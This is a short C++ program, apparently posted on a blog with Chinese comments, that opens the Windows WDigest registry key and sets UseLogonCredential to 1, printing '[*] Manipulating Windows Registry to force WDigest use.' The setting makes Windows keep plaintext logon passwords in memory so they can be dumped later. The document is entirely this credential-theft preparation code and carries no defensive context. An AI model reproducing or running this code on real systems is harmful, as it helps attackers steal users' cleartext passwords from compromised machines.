    <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UseLogonCredential</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UseLogonCredential();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UseLogonCredential</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span>	lRet;</span><br><span class="line">	HKEY	hKey;</span><br><span class="line">	DWORD	WDigest;</span><br><span class="line">	DWORD	dwType = REG_DWORD;</span><br><span class="line">	DWORD	dwValue;</span><br><span class="line">	DWORD	dwuC = <span class="number">1</span>;</span><br><span class="line">	lRet = RegOpenKeyEx(</span><br><span class="line">		HKEY_LOCAL_MACHINE,</span><br><span class="line">		_T( <span class="string">"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"</span> ),</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		KEY_QUERY_VALUE | KEY_SET_VALUE,</span><br><span class="line">		&amp;hKey</span><br><span class="line">		);                      <span class="comment">/* 打开注册表 */</span></span><br><span class="line">	<span class="keyword">if</span> ( lRet == ERROR_SUCCESS )    <span class="comment">/* 读操作成功 */</span></span><br><span class="line">	&#123;</span><br><span class="line">		lRet = RegQueryValueEx(</span><br><span class="line">			hKey,</span><br><span class="line">			_T( <span class="string">"UseLogonCredential"</span> ),</span><br><span class="line">			<span class="number">0</span>,</span><br><span class="line">			&amp;dwType,</span><br><span class="line">			(LPBYTE) &amp;WDigest,</span><br><span class="line">			&amp;dwValue</span><br><span class="line">			); </span><br><span class="line"></span><br><span class="line">		<span class="comment">//不存在该键则不修改</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> ( lRet != <span class="number">2</span> &amp;&amp; WDigest != <span class="number">1</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		</span><br><span class="line">			<span class="built_in">printf</span>( <span class="string">"[*] Manipulating Windows Registry to force WDigest use."</span> );</span><br><span class="line">			lRet = RegSetValueEx( hKey, _T( <span class="string">"UseLogonCredential"</span> ), <span class="number">0</span>, REG_DWORD, (BYTE *) &amp;dwuC, <span class="keyword">sizeof</span>(DWORD) );</span><br><span class="line">			<span class="keyword">if</span> ( lRet != <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				_tprintf( TEXT( <span class="string">"\nRegSetValueEx failed with error %u\n"</span> ), lRet );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(WDigest == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//修改成功</span></span><br><span class="line">            <span class="built_in">printf</span>( <span class="string">"[*] Manipulating Windows Registry to force WDigest use."</span> );</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  </div>
